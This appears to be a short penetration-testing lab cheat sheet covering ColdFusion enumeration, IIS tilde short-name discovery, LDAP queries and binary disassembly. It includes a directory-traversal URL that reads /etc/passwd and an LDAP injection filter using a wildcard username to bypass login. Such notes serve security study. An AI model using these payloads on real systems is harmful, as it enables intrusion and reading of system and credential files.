## ColdFusion Enumeration Methods
Port Scanning (usually 80,443), File Extensions (.cfm,.cfc), HTTP Headers (X-Powered-By: ColdFusion), Error Messages (ColdFusion-specific tags or functions), Default Files (admin.cfm or CFIDE/administrator/index.cfm)

## Attacking ColdFusion
searchsploit adobe coldfusion

http://example.com/index.cfm?directory=../../../etc/&file=passwd

## IIS Tilde Enumeration
For example directory like http://example.com/SecretDocuments

http://example.com/~a => 404 Not Found

http://example.com/~b => 404 Not Found

http://example.com/~s => 200 OK

http://example.com/~sa => 404 Not Found

http://example.com/~se => 200 OK

or 

java -jar iis_shortname_scanner.jar 0 5 http://10.129.204.231/

## Attacking LDAP
ldapsearch -H ldap://ldap.example.com:389 -D "cn=admin,dc=example,dc=com" -w secret123 -b "ou=people,dc=example,dc=com" "(mail=john.doe@example.com)"

(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

$username = "*";
$password = "dummy";
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

## Attacking Applications Connecting to Services
gdb ./application

gdb-peda$ set disassembly-flavor intel

gdb-peda$ disas main

Get-FileMetaData .\MultimasterAPI.dll


## Other Notable Applications
Axis2, Websphere, Elasticsearch, Zabbix, Nagios, WebLogic, Wikis/Intranets, DotNetNuke, vCenter